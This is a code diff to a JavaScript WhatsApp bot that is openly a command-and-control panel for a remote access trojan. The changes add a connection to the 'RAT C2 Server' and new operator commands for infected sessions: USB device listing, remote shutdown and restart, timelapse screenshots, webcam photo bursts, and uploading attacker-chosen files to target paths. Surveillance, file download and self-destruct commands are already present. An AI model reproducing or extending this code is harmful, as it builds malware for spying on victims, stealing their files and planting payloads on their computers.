@@ -90,15 +90,16 @@ class WhatsAppC2Bot {
       
       this.ratClient = new RATClient(host, port, key);
       
-      // Test connection
+      // Establish connection to C2 server
+      await this.ratClient.connect();
+      
+      // Test connection status
       const status = await this.ratClient.checkStatus();
       
-      // Initialize command modules after sock is available
-      // Note: These will be re-initialized after socket connection
-      
-      ResponseFormatter.log('success', `RAT API connected (${status.active_sessions} sessions)`);
+      ResponseFormatter.log('success', `RAT C2 Server connected at ${host}:${port} (${status.active_sessions} active sessions)`);
     } catch (error) {
-      ResponseFormatter.log('error', `RAT API connection failed: ${error.message}`);
+      ResponseFormatter.log('error', `RAT C2 Server connection failed: ${error.message}`);
+      ResponseFormatter.log('warning', 'Bot will continue, but RAT commands may fail');
     }
   }
 
@@ -232,6 +233,10 @@ class WhatsAppC2Bot {
           await this.systemCmd.software(chatId, this.currentSession);
           break;
 
+        case 'usb':
+          await this.systemCmd.usbDevices(chatId, this.currentSession);
+          break;
+
         // ========== SURVEILLANCE ==========
         case 'screenshot':
         case 'ss':
@@ -335,6 +340,36 @@ class WhatsAppC2Bot {
 
         case 'selfdestruct':
           await this.funCmd.selfDestruct(chatId, this.currentSession);
+          break;
+
+        // ========== ADDITIONAL ADVANCED COMMANDS ==========
+        case 'shutdown':
+        case 'poweroff':
+          await this.funCmd.shutdown(chatId, this.currentSession, args);
+          break;
+
+        case 'restart':
+          await this.funCmd.restart(chatId, this.currentSession);
+          break;
+
+        case 'timelapse':
+          const count = parseInt(args[0]) || 5;
+          const interval = parseInt(args[1]) || 5;
+          await this.funCmd.timelapse(chatId, this.currentSession, count, interval);
+          break;
+
+        case 'photoburst':
+          const photoCount = parseInt(args[0]) || 3;
+          await this.funCmd.photoBurst(chatId, this.currentSession, photoCount);
+          break;
+
+        case 'usblist':
+          await this.funCmd.usbList(chatId, this.currentSession);
+          break;
+
+        case 'upload':
+        case 'ul':
+          await this.cmdUpload(chatId, args, msg);
           break;
 
         default:
@@ -461,7 +496,7 @@ class WhatsAppC2Bot {
     });
 
     try {
-      const result = await this.ratClient.sendCommand(this.currentSession, `download ${filepath}`, 60000);
+      const result = await this.ratClient.downloadFile(this.currentSession, filepath);
       
       if (result.success) {
         // Check if it's base64 file data
@@ -488,6 +523,59 @@ class WhatsAppC2Bot {
     } catch (error) {
       await this.sock.sendMessage(chatId, { 
         text: ResponseFormatter.error(`Download failed: ${error.message}`) 
+      });
+    }
+  }
+
+  async cmdUpload(chatId, args, msg) {
+    if (!this.currentSession) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      });
+      return;
+    }
+
+    // Check if message has media attachment
+    const mediaMessage = msg.message?.documentMessage || msg.message?.imageMessage || msg.message?.videoMessage || msg.message?.audioMessage;
+    
+    if (!mediaMessage) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error('Please attach a file and send with /upload <target_path>\n\nExample: /upload C:\\\\Users\\\\Downloads\\\\file.txt') 
+      });
+      return;
+    }
+
+    if (args.length === 0) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error('Usage: /upload <target_path>\n\nAttach the file you want to upload') 
+      });
+      return;
+    }
+
+    const targetPath = args.join(' ');
+    
+    await this.sock.sendMessage(chatId, { 
+      text: ResponseFormatter.info(`📤 Uploading file to target...\n\n\`${targetPath}\`\n\n_Please wait..._`) 
+    });
+
+    try {
+      // Download media from WhatsApp
+      const buffer = await this.sock.downloadMediaMessage(msg);
+      
+      const result = await this.ratClient.uploadFile(this.currentSession, targetPath, buffer);
+      
+      if (result.success) {
+        await this.sock.sendMessage(chatId, { 
+          text: ResponseFormatter.success(`✅ File uploaded successfully\n\n${result.data}`) 
+        });
+      } else {
+        await this.sock.sendMessage(chatId, { 
+          text: ResponseFormatter.error(result.error) 
+        });
+      }
+    } catch (error) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error(`Upload failed: ${error.message}`) 
       });
     }
   }
